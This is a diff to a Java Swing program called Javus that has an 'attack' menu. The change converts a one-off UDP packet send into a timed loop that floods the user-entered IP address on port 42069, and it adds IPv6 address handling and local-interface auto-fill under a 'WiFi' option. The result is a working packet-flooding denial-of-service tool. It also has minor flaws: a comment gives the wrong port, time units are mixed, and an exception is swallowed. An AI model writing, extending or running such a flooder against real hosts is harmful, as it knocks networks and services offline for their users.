@@ -2,6 +2,9 @@ import java.awt.event.ActionEvent;
 import java.io.IOException;
 import java.net.*;
 import java.util.Enumeration;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 import javax.swing.*;
 
 public class Javus {
@@ -35,17 +38,36 @@ public class Javus {
         });
     }
 
-    public static void Start(String ip, String PKSize, Integer Time, Integer Delay) throws IOException {
+    public static void Start(String ip, String PKSize, Integer Time, Integer Delay) throws IOException, InterruptedException {
         try {
-            DatagramSocket door = new DatagramSocket();
-            byte[] buffer = "Hello From Javus :)".getBytes();
-            InetAddress address = InetAddress.getByName(ip);
-            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 42069);
-            door.send(packet);
-            door.close();
+            try (DatagramSocket door = new DatagramSocket()) {
+                byte[] buffer = "Hello From Javus :)".getBytes();
+                InetAddress address;
+                if (ip.contains("%")) {
+                    String[] parts = ip.split("%");
+                    address = Inet6Address.getByAddress(null, InetAddress.getByName(parts[0]).getAddress(), NetworkInterface.getByName(parts[1]).getIndex());
+                } else {
+                    address = InetAddress.getByName(ip);
+                }
+                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 42069); // Assuming port 12345
+                ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
+                Runnable task = () -> {
+                    try {
+                        long endTime = System.currentTimeMillis() + Time;
+                        while (System.currentTimeMillis() < endTime) {
+                            door.send(packet);
+                        }
+                    } catch (IOException ex) {
+                        System.out.println("Error on 55: " + ex);
+                    }
+                };
+                executor.scheduleAtFixedRate(task, 0, Delay, TimeUnit.MILLISECONDS);
+                executor.awaitTermination(Time, TimeUnit.SECONDS);
+                executor.shutdown();
+            }
 
         } catch (SocketException ex) {
-            System.out.println("Error: " + ex);
+            System.out.println("Error 64: " + ex);
             System.out.println("\n\nPlease provide the above text and a screenshot of Javus here:\nhttps://github.com/TokynBlast/Javus/issues");
         } finally {}
     }
@@ -96,9 +118,9 @@ public class Javus {
                 try {
                     Start(IP.getText(), PacketSize.getText(), Integer.valueOf(Time.getText()), Integer.valueOf(Delay.getText()));
                 } catch (IOException ex) {
-                    System.out.println("Error: " + ex);
+                    System.out.println("Error on line 115: " + ex);
                    System.out.println("\n\nPlease provide the above text and a screenshot of Javus here:\nhttps://github.com/TokynBlast/Javus/issues");
-                }
+                } catch (InterruptedException ex) {}
             }
             else if (BeginEnd.getText().equals("Stop")) {
                 BeginEnd.setText("Begin");
@@ -114,16 +136,23 @@ public class Javus {
             
             else if (attack.getSelectedItem().equals("WiFi")) {
                 try {
-                    Enumeration Net = NetworkInterface.getNetworkInterfaces();
+                    Enumeration<NetworkInterface> Net = NetworkInterface.getNetworkInterfaces();
                     while (Net.hasMoreElements()) {
-                        NetworkInterface currentInterface = (NetworkInterface) Net.nextElement();
-                        Enumeration addresses = currentInterface.getInetAddresses();
+                        NetworkInterface currentInterface = Net.nextElement();
+                        Enumeration<InetAddress> addresses = currentInterface.getInetAddresses();
                         if (currentInterface.isUp() && !currentInterface.isLoopback() && !currentInterface.isVirtual() && !currentInterface.isPointToPoint()) {
                             String displayName = currentInterface.getDisplayName().toLowerCase();
                             if (!displayName.contains("virtual") && !displayName.contains("vmware") && !displayName.contains("vbox")) {
                                 if (addresses.hasMoreElements()) {
-                                    InetAddress address = (InetAddress) addresses.nextElement();
-                                    IP.setText(address.getHostAddress());
+                                    InetAddress address = addresses.nextElement();
+                                    String ipAddress = address.getHostAddress();
+                                    if (address instanceof Inet6Address) {
+                                        ipAddress = ipAddress.split("%")[0]; // Remove anything after %
+                                        ipAddress = ipAddress.replaceAll("[^0-9a-fA-F:]", ""); // Remove anything not a colon, number or character
+                                    } else if (address instanceof Inet4Address) {
+                                        ipAddress = ipAddress.replaceAll("[^0-9.]", ""); // Remove anything not a number or dot
+                                    }
+                                    IP.setText(ipAddress);
                                 }
                             }
                         }
